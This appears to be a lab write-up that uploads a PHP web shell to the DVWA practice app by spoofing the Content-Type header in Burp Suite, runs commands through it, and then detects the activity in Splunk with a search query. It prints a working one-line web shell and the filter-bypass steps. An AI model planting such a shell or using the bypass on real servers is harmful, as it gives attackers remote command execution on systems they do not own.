In file upload vulnerability we will try to upload a simple php shell in the upload section and try to execute command on the victim pc

Simple php shell
```
<?php
if(isset($_GET['cmd'])){
    system($_GET['cmd']);
}
?>
```
create a .php file and paste the code into it

Now we will try to upload it into dvwa server

![image](https://github.com/user-attachments/assets/f02dda76-671a-40b8-a531-2e92ba49a56c)

![image](https://github.com/user-attachments/assets/d18b0643-30a1-4c78-8281-58f350dc5f0d)

We were not able to upload the php file as it restricts uploading any file other than image files

Now we will use burpsuite to bypass this and upload the php file

Open burpsuite go to proxy section and open the browser within it,go to the file upload section within dvwa

![image](https://github.com/user-attachments/assets/a9e30479-bb1f-453d-90a6-aaa01b7e3fcf)

Now turn on the interception and upload the php file

![image](https://github.com/user-attachments/assets/02a041db-ed4a-49d9-8261-dc972e07b99d)

After intercepting the file right click on it and select 'send to repeater' option

![image](https://github.com/user-attachments/assets/cf7dcaaa-dcd4-4b30-b048-bc32794ea95a)

Now on the repeater tab, near the Content-Type field change it from application 'application/x-php' to 'image/png'

![image](https://github.com/user-attachments/assets/27c06c74-eaa7-46d1-b86a-24bfa71d4386)

On the right side we can see that the php file was uploaded successfully

Now stop the intercept,copy the path `../../hackable/uploads/shell.php' and replace it on the '#' in the url also add the commands for execution
eg
```
?cmd=hostname
```
After pressing enter we will be directed to the php shell where commands could be executed

![image](https://github.com/user-attachments/assets/4e0aed69-da68-43a0-8003-1b021bf2803f)

Attack successful. Now, try to detect it from Splunk Enterprise:

![image](https://github.com/user-attachments/assets/bad9cfe5-f970-4c3b-a805-34f470595d82)

On the uri/uri_path field we can see commands that have been executed using 'cmd' command

![image](https://github.com/user-attachments/assets/280e99fe-c1d6-4a41-a376-2b093b261827)

On the file field we can see the files uploaded 

![image](https://github.com/user-attachments/assets/8cf7e9be-6dec-4ff7-958e-0b6394d4d5ed)

Also by using this commnad we can see which all commands were executed on the victim pc by the attacker

```
index=* sourcetype="access_combined"
(uri_query="cmd=*")
| eval Command=urldecode(replace(uri_query, ".*cmd=", ""))
| table _time, clientip, uri, Command, useragent, req_time, bytes
| sort - _time
```
![image](https://github.com/user-attachments/assets/5d4026d5-f669-497c-8c62-99a9d4840c70)

